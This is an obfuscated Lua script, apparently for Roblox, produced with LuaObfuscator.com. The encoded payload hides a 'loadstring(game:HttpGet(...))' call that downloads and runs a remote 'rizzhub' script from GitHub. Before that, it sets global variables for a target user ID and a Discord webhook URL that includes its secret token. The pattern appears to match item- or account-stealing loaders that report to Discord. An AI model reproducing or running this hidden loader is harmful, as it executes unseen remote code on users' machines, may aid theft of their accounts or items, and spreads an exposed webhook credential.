--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then v19=v0(v3(v20,1,1));return "";else local v77=0;local v78;while true do if (v77==0) then v78=v2(v0(v20,16));if v19 then local v105=0;local v106;while true do if (v105==1) then return v106;end if (0==v105) then v106=v5(v78,v19);v19=nil;v105=1;end end else return v78;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v79=(v22/((2 -0)^(v23-(657 -(451 + (1261 -(277 + 779)))))))%((3 -1)^(((v24-((1 -0) + 0)) -(v23-(1696 -(1526 + 169)))) + 1 + 0)) ;return v79-(v79%(574 -(117 + 456))) ;else local v80=0 + 0 ;local v81;while true do if (v80==(225 -(172 + (1010 -(174 + 783))))) then v81=(4 -(4 -2))^(v23-(2 -1)) ;return (((v22%(v81 + v81))>=v81) and (1 + 0)) or (0 -0) ;end end end end local function v25()local v38=0 -0 ;local v39;while true do if (v38==(1806 -(30 + 1775))) then return v39;end if (v38==(0 -(0 -0))) then v39=v1(v16,v18,v18);v18=v18 + (1487 -(253 + 1233)) ;v38=1 -0 ;end end end local function v26()local v40=1696 -(22 + 1674) ;local v41;local v42;while true do if ((0 + 0)==v40) then v41,v42=v1(v16,v18,v18 + (1997 -(1488 + 434 + 73)) );v18=v18 + 2 ;v40=825 -(594 + 230) ;end if (v40==(1376 -((1742 -(102 + 512)) + 247))) then return (v42 * (1053 -797)) + v41 ;end end end local function v27()local v43=214 -((457 -310) + 67) ;local v44;local v45;local v46;local v47;while true do if (0==v43) then v44,v45,v46,v47=v1(v16,v18,v18 + (11 -8) );v18=v18 + (9 -5) ;v43=1 + 0 + 0 ;end if (v43==(3 -2)) then return (v47 * (13960396 + 2816820)) + (v46 * (41082 + 24454)) + (v45 * (409 -((585 -(339 + 179)) + 86))) + v44 ;end end end local function v28()local v48=90 -(32 + 58) ;local v49;local v50;local v51;local v52;local v53;local v54;while true do if ((1 + 1)==v48) then v53=v21(v50,21,151 -120 );v54=((v21(v50,1 + 31 )==(2 -1)) and  -((2874 -1465) -(1358 + 50))) or (1 + 0) ;v48=(825 -460) -((1146 -(64 + 900)) + 180) ;end if (v48==(1553 -(1408 + 145))) then v49=v27();v50=v27();v48=1;end if (v48==((333 -(25 + 302)) -3)) then if (v53==0) then if (v52==(1256 -(1045 + (333 -(114 + 8))))) then return v54 * (0 + 0) ;else local v107=0;while true do if (v107==(0 -0)) then v53=1 -0 ;v51=0 -0 ;break;end end end elseif (v53==(8975 -6928)) then return ((v52==(1234 -(433 + 801))) and (v54 * ((3 -2)/(0 -0)))) or (v54 * NaN) ;end return v8(v54,v53-1023 ) * (v51 + (v52/((1 + 1)^(1395 -(371 + 972))))) ;end if (v48==1) then v51=1 + (1085 -(1047 + 38)) ;v52=(v21(v50,1 + 0 ,20) * ((1797 -(1063 + 732))^(18 + 14))) + v49 ;v48=5 -(2 + 1) ;end end end local function v29(v30)local v55;if  not v30 then v30=v27();if (v30==(0 + 0)) then return "";end end v55=v3(v16,v18,(v18 + v30) -(1 + 0) );v18=v18 + v30 ;local v56={};for v70=1301 -(1228 + 72) , #v55 do v56[v70]=v2(v1(v3(v55,v70,v70)));end return v6(v56);end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v57=0 + 0 ;local v58;local v59;local v60;local v61;local v62;local v63;local v64;local v65;local v66;while true do if (v57==2) then v62=nil;v63=nil;v57=3;end if (v57~=3) then else v64=nil;v65=nil;v57=4;end if ((1421 -(1282 + 135))==v57) then v66=nil;while true do if (v58==1) then local v100=0;while true do if (v100==(867 -(388 + 478))) then v58=2;break;end if (v100~=0) then else v61=nil;v62=nil;v100=1 + 0 ;end end end if (v58~=(0 -0)) then else local v101=0;while true do if (v101==(419 -(74 + 345))) then v59=0 -0 ;v60=nil;v101=1 + 0 ;end if (v101==(1 + 0)) then v58=1;break;end end end if (3~=v58) then else local v102=0 + 0 ;while true do if (v102==(4 -3)) then v58=4;break;end if (v102~=0) then else v65=nil;v66=nil;v102=1;end end end if (v58~=(1852 -(910 + 940))) then else v63=nil;v64=nil;v58=44 -(8 + 33) ;end if (v58==(6 -2)) then while true do if (v59==(1497 -(1480 + 15))) then v64=nil;v65=nil;v59=3;end if (1==v59) then local v108=0;while true do if (v108~=1) then else v59=1268 -(216 + 1050) ;break;end if (v108~=(0 -0)) then else local v112=0;while true do if (v112~=(1 + 0)) then else v108=1 + 0 ;break;end if (v112==(0 -0)) then v62=nil;v63=nil;v112=1;end end end end end if (v59==3) then v66=nil;while true do local v109=1421 -(70 + 1351) ;local v110;local v111;while true do if (v109~=(1327 -(442 + 885))) then else v110=0;v111=nil;v109=2 -1 ;end if (v109==1) then while true do if (v110==(0 + 0)) then v111=0 + 0 ;while true do if (v111==0) then if (0==v60) then local v141=0 + 0 ;local v142;local v143;while true do if (0==v141) then v142=1902 -(61 + 1841) ;v143=nil;v141=1;end if (v141==1) then while true do if (v142==(503 -(244 + 259))) then v143=0;while true do if (v143==0) then local v178=0 -0 ;local v179;while true do if (0~=v178) then else v179=0 -0 ;while true do if (v179==0) then v61={};v62={};v179=1 + 0 ;end if (v179~=1) then else v143=1 -0 ;break;end end break;end end end if (1==v143) then v63={};v60=1;break;end end break;end end break;end end end if (v60==(1210 -(727 + 481))) then local v144=0;while true do if (v144==(1489 -(815 + 673))) then for v161=1,v27() do local v162=0;local v163;local v164;while true do if (v162==0) then v163=0 -0 ;v164=nil;v162=3 -2 ;end if (v162~=1) then else while true do if (v163~=0) then else v164=v25();if (v21(v164,2 -1 ,1)==0) then local v185=0;local v186;local v187;local v188;local v189;local v190;while true do if (2~=v185) then else v190=nil;while true do if (v186==(0 -0)) then local v197=0;while true do if (v197==(552 -(54 + 498))) then v187=0;v188=nil;v197=1;end if (v197==1) then v186=1 + 0 ;break;end end end if (v186==1) then local v198=0 -0 ;while true do if (v198==0) then v189=nil;v190=nil;v198=1 + 0 ;end if (v198==1) then v186=1535 -(578 + 955) ;break;end end end if (v186~=(1 + 1)) then else while true do if (v187~=3) then else if (v21(v189,3,3)~=(1 + 0)) then else v190[1537 -(1173 + 360) ]=v66[v190[10 -6 ]];end v61[v161]=v190;break;end if (0==v187) then local v200=487 -(56 + 431) ;local v201;while true do if (v200==(0 -0)) then v201=0;while true do if (v201==(3 -2)) then v187=1;break;end if (v201==0) then v188=v21(v164,2,1 + 2 );v189=v21(v164,3 + 1 ,6);v201=1;end end break;end end end if (v187==(3 -1)) then local v202=0;while true do if (v202==0) then local v207=0 -0 ;while true do if (v207==(2 -1)) then v202=3 -2 ;break;end if (v207==(0 + 0)) then local v208=0 + 0 ;while true do if (v208~=(1 + 0)) then else v207=1 + 0 ;break;end if (0==v208) then if (v21(v189,688 -(301 + 386) ,4 -3 )~=(2 -1)) then else v190[2 -0 ]=v66[v190[3 -1 ]];end if (v21(v189,1902 -(1860 + 40) ,2)~=1) then else v190[3]=v66[v190[387 -(103 + 281) ]];end v208=1718 -(1099 + 618) ;end end end end end if (v202~=1) then else v187=1 + 2 ;break;end end end if (v187==1) then local v203=0;local v204;while true do if (v203==(1039 -(644 + 395))) then v204=0 -0 ;while true do if (v204==0) then local v209=0 -0 ;while true do if (0==v209) then v190={v26(),v26(),nil,nil};if (v188==(0 -0)) then local v214=0;local v215;while true do if (v214==0) then v215=1018 -(68 + 950) ;while true do if (v215~=0) then else v190[9 -6 ]=v26();v190[648 -(375 + 269) ]=v26();break;end end break;end end elseif (v188==(1 + 0)) then v190[2 + 1 ]=v27();elseif (v188==(1462 -(876 + 584))) then v190[3]=v27() -((3 -1)^16) ;elseif (v188==3) then local v220=1981 -(1136 + 845) ;while true do if (v220==(0 + 0)) then v190[3]=v27() -(2^16) ;v190[1212 -(723 + 485) ]=v26();break;end end end v209=1970 -(1433 + 536) ;end if (v209==(820 -(507 + 312))) then v204=1;break;end end end if (v204~=(2 -1)) then else v187=2;break;end end break;end end end end break;end end break;end if ((0 + 0)==v185) then v186=0 + 0 ;v187=nil;v185=1;end if (v185~=(1 -0)) then else v188=nil;v189=nil;v185=2;end end end break;end end break;end end end v60=10 -7 ;break;end if (0==v144) then local v156=390 -(30 + 360) ;while true do if (v156~=1) then else v144=1 + 0 ;break;end if (v156==0) then for v171=2 -1 ,v65 do local v172=0 -0 ;local v173;local v174;local v175;local v176;while true do if (v172==(909 -(295 + 614))) then v173=0 + 0 ;v174=nil;v172=1;end if (v172==1) then local v180=0;while true do if (v180~=(1 + 0)) then else v172=2 + 0 ;break;end if (v180==0) then v175=nil;v176=nil;v180=1 + 0 ;end end end if (v172==(2 + 0)) then while true do if (v173~=1) then else v176=nil;while true do if (v174~=1) then else if (v175==1) then v176=v25()~=0 ;elseif (v175==(7 -5)) then v176=v28();elseif (v175==(1660 -(167 + 1490))) then v176=v29();end v66[v171]=v176;break;end if (v174==0) then local v195=0;local v196;while true do if (v195==(0 -0)) then v196=0 + 0 ;while true do if (v196==(1392 -(993 + 398))) then v174=1;break;end if (v196~=(0 -0)) then else v175=v25();v176=nil;v196=1;end end break;end end end end break;end if ((959 -(931 + 28))==v173) then local v193=0;while true do if (0==v193) then v174=55 -(27 + 28) ;v175=nil;v193=1;end if (v193==1) then v173=1;break;end end end end break;end end end v64[3]=v25();v156=1;end end end end end v111=1075 -(240 + 834) ;end if (v111~=1) then else if (v60~=3) then else local v145=0 -0 ;local v146;while true do if ((1385 -(420 + 965))~=v145) then else v146=357 -(342 + 15) ;while true do if (v146==(3 -2)) then return v64;end if (0==v146) then local v168=0;while true do if (v168==0) then for v181=1,v27() do v62[v181-1 ]=v33();end for v183=1 + 0 ,v27() do v63[v183]=v27();end v168=1 + 0 ;end if (v168==1) then v146=1 -0 ;break;end end end end break;end end end if (v60~=1) then else local v147=0;local v148;while true do if (v147==0) then v148=0 -0 ;while true do if (v148==0) then local v169=0 + 0 ;local v170;while true do if (v169~=(0 + 0)) then else v170=0;while true do if (v170==0) then v64={v61,v62,nil,v63};v65=v27();v170=2 -1 ;end if ((1 + 0)==v170) then v148=1 + 0 ;break;end end break;end end end if (v148~=(1 + 0)) then else v66={};v60=1 + 1 ;break;end end break;end end end break;end end break;end end break;end end end break;end if (v59==(0 + 0)) then v60=0 + 0 ;v61=nil;v59=1 + 0 ;end end break;end end break;end if (v57==(1717 -(718 + 999))) then v58=0;v59=nil;v57=1 -0 ;end if (v57==(1 + 0)) then v60=nil;v61=nil;v57=2;end end end local function v34(v35,v36,v37)local v67=v35[1];local v68=v35[2];local v69=v35[3];return function(...)local v72=1;local v73= -1;local v74={...};local v75=v12("#",...) -1 ;local function v76()local v82=v67;local v83=v68;local v84=v69;local v85=v32;local v86={};local v87={};local v88={};for v92=0,v75 do if (((11279 -6805)>(2489 -(184 + 736))) and (v92>=v84)) then v86[v92-v84 ]=v74[v92 + 1 ];else v88[v92]=v74[v92 + (1 -0) ];end end local v89=(v75-v84) + 1 + 0 + 0 ;local v90;local v91;while true do local v93=0 -0 ;while true do if (((4987 -((464 -229) + 78))>=((20149 -14705) -((3816 -2099) + 81))) and (v93==(1 + 0))) then if (((14328 -9356)==(6878 -1906)) and (v91<=(10 -6))) then if ((((4460 -1925) -(1221 -306))>=(2930 -(1546 + 276))) and (v91<=(1 + 0))) then if ((v91==(1219 -(1047 + 172))) or ((1727 + 137 + 416)>(718 + (3692 -1659)))) then if ((((1008 + 4817) -(35 + (1732 -(465 + 212))))>=(1978 -(783 + 361))) and (v88[v90[5 -3 ]]==v90[818 -(712 + 102) ])) then v72=v72 + 1 + 0 ;else v72=v90[9 -6 ];end else v88[v90[6 -4 ]]=v37[v90[3 + 0 ]];end elseif (((94 + 2360)<=(3435 + 416)) and (v91<=(1 + 1))) then v88[v90[5 -3 ]][v90[2 + 1 ]]=v90[9 -(7 -2) ];elseif ((v91>3) or ((8030 -3480)<=(2848 -(84 + 180)))) then local v122=(0 -0) -0 ;local v123;local v124;local v125;local v126;while true do if ((((768 + 6229) -4119)>(4765 -2764)) and (v122==((278 -(216 + 55)) -5))) then while true do if (((1282 -(330 + 348 + 91 + 200))<(2071 -(94 + 91 + 129))) and (v123==(3 -(1228 -(901 + 325))))) then v126=nil;while true do if ((v124==((0 + 0) -(0 + 0))) or ((2960 + 737)<=(3938 -(17 + 1090)))) then local v149=(0 + 0) -0 ;while true do if ((((194 -(35 + 136)) + 61)<=(2633 + (1866 -(190 + 1596)))) and (v149==(1 + 0 + 0))) then v124=1 + 0 ;break;end if ((v149==((1606 -(544 + 1062)) -(1205 -(945 + 260)))) or ((1054 -508)<(2201 -(751 + 938)))) then v125=v90[389 -(7 + 380) ];v126=v88[v90[7 -4 ]];v149=2 -1 ;end end end if (((6046 -(2237 + 1716))>(1413 -(163 + 435))) and (v124==(632 -(615 + 16)))) then v88[v125 + (621 -(259 + 361)) ]=v126;v88[v125]=v126[v90[4 + 0 ]];break;end end break;end if ((v123==(569 -(419 + 150))) or ((2825 -1112)<=(5967 -4323))) then v124=1672 -(908 + 764) ;v125=nil;v123=1 -0 ;end end break;end if (((862 + 500 + 1781)==(8816 -(6471 -(157 + 641)))) and (v122==(1760 -(1406 + 354)))) then v123=0 + 0 ;v124=nil;v122=3 -2 ;end if (((5599 -(329 + 274))>(2932 -1779)) and ((1 + (0 -0))==v122)) then v125=nil;v126=nil;v122=2 + 0 ;end end else for v136=v90[1353 -(24 + 1327) ],v90[11 -8 ] do v88[v136]=nil;end end elseif ((v91<=(10 -3)) or (((16254 -5198) -7648)<=2025)) then if ((v91<=((2675 -(1528 + 62)) -(467 + 613))) or ((3656 -(1167 + 110))==(2200 + 101 + 920))) then local v117=0 -0 ;local v118;local v119;while true do if ((v117==(3 -2)) or ((13104 -9387)<((5854 -3389) -(2144 -(171 + 228))))) then while true do if ((0==v118) or ((5465 -1291)<((142 -71) + 248 + 316))) then v119=v90[1 + 0 + 1 ];v88[v119]=v88[v119](v13(v88,v119 + (2 -(181 -(38 + 142))) ,v73));break;end end break;end if ((v117==(0 -0)) or ((3036 -(598 + (873 -551)))==((18316 -14180) -((364 -207) + 27)))) then v118=421 -(224 + 197) ;v119=nil;v117=1 + 0 + 0 ;end end elseif ((v91>((1374 -(1186 + 160)) -22)) or ((7669 -4045)>(5813 -(749 + (2009 -(652 + 285)))))) then local v127=832 -(272 + 560) ;local v128;local v129;local v130;local v131;local v132;local v133;while true do if ((v127==(0 + 0 + 0)) or ((1745 -(276 + 472))>=4153)) then v128=0;v129=nil;v127=4 -3 ;end if ((v127==(3 + 0)) or ((7790 -5670)<=(3062 -(1140 + 15)))) then while true do if ((((3277 -1926) -(223 + 344))<=(897 + 2992)) and (v128==(840 -(358 + 481)))) then v131=nil;v132=nil;v128=894 -(648 + 244) ;end if ((3019==((3777 -(156 + 312)) -(133 + (851 -(63 + 631))))) and ((0 + 0)==v128)) then local v140=0 + 0 ;while true do if ((v140==1) or ((1231 + 220)>(4810 -2380))) then v128=88 -(15 + 36 + 36) ;break;end if ((v140==((0 -0) -0)) or ((4341 -(130 + 465))<=1559)) then v129=0 -0 ;v130=nil;v140=1316 -(1055 + (823 -(254 + 309))) ;end end end if ((4435>=(6236 -(680 + 1258))) and ((2 + 0)==v128)) then v133=nil;while true do if ((v129==0) or ((702 + 77)==(667 + 1395))) then local v153=0 + 0 ;local v154;while true do if ((v153==((23 -(21 + 2)) -(440 -(214 + 226)))) or ((3264 -(896 + (406 -265)))>=(4730 -((325 -213) + 205)))) then v154=(919 + 60) -(884 + 95) ;while true do if (((589 -(8 + 6))==(1002 -((1487 -(795 + 436)) + 171))) and (v154==(1 -0))) then v129=1 -0 ;break;end if (((1526 -(900 + 107))<=((6577 -(595 + 1252)) -(711 + 669))) and (v154==(0 -(0 + 0)))) then v130=v90[2 -0 ];v131,v132=v85(v88[v130](v13(v88,v130 + (4 -3) ,v90[6 -3 ])));v154=1806 -(512 + 1293) ;end end break;end end end if ((v129==(298 -(239 + 57))) or ((1593 -(117 + 257 + 187))==1396)) then for v157=v130,v73 do local v158=725 -(36 + 175 + 514) ;local v159;local v160;while true do if ((v158==((4 -3) + 0)) or ((4095 -(582 + (2638 -1739)))>(4177 -(431 + 307)))) then while true do if (((0 -(0 + 0))==v159) or ((4432 -(120 + 860))==(1908 + 371))) then v160=0 -0 ;while true do if (((3464 -(348 + 890))<(14507 -10012)) and (v160==(0 + 0))) then v133=v133 + (1238 -(574 + 515 + (846 -(284 + 414)))) ;v88[v157]=v131[v133];break;end end break;end end break;end if ((v158==(700 -(43 + 657))) or (((378 + 457) -(513 -(88 + 65)))>=((1237 + 1789) -(288 + 12)))) then v159=0 + 0 ;v160=nil;v158=1 + 0 ;end end end break;end if (((265 + 915)<=(7444 -(4344 -(594 + 803)))) and (v129==(369 -(206 + (890 -(557 + 171)))))) then local v155=1041 -(686 + 355) ;while true do if (((863 + 1821)>(726 + 642)) and (v155==(32 -(30 + 2)))) then v73=(v132 + v130) -(1 + 0 + 0) ;v133=(0 -0) + 0 ;v155=(2 + 1) -2 ;end if (((1 + 0)==v155) or ((12632 -8167)<=(11326 -7447))) then v129=1 + 1 ;break;end end end end break;end end break;end if ((v127==(2 + 0)) or ((3751 -(1502 + 461))<1743)) then v132=nil;v133=nil;v127=(2 + 4) -(243 -(183 + 57)) ;end if ((v127==(1399 -(276 + 1122))) or ((2792 -803)>(1947 + 932))) then v130=nil;v131=nil;v127=1 + 1 ;end end else v88[v90[7 -5 ]]();end elseif (((3436 -((2939 -1754) + 714))<=(6753 -2005)) and (v91<=(19 -(28 -17)))) then v72=v90[1 + 2 ];elseif (((755 + 554 + 784)>=(5573 -4034)) and (v91==(18 -9))) then do return;end else v88[v90[137 -(25 + (952 -(113 + 729))) ]]=v90[(6 -4) + 1 ];end v72=v72 + (958 -(476 + 481)) + 0 ;break;end if (((1980 + 48)<=(4230 -((917 -(434 + 349)) + 1033))) and (v93==(1443 -(555 + 888)))) then v90=v82[v72];v91=v90[1 + 0 ];v93=1934 -(1660 + 273) ;end end end end A,B=v32(v11(v76));if  not A[1] then local v94=0;local v95;while true do if (v94==0) then v95=v35[4][v72] or "?" ;error("Script error at ["   .. v95   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end return v34(v33(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F72692O7A6875622F6D61696E2F5363726970742E6C756103023O005F4703063O00557365724944022O0080A9488FCB4103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130382O343936393336313432332O373038302F6E4F6953766A724C38634C69496446696C634434485F514553506F7A795A50492O3645586238734842564F625A2D766448796235487967766D584455617444486835565F001A3O00120A3O00014O0003000100013O00264O0002000100010004083O0002000100120A000100013O00262O0001000F000100020004083O000F0001001201000200033O001201000300043O00200400030003000500120A000500064O0007000300054O000500023O00022O00060002000100010004083O0019000100262O00010005000100010004083O00050001001201000200073O003002000200080009001201000200073O0030020002000A000B00120A000100023O0004083O000500010004083O001900010004083O000200012O00093O00017O001A3O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O000A3O000C3O000C3O000D3O000D3O000E3O000E3O000F3O00103O00123O00133O00153O00",v9(),...);end
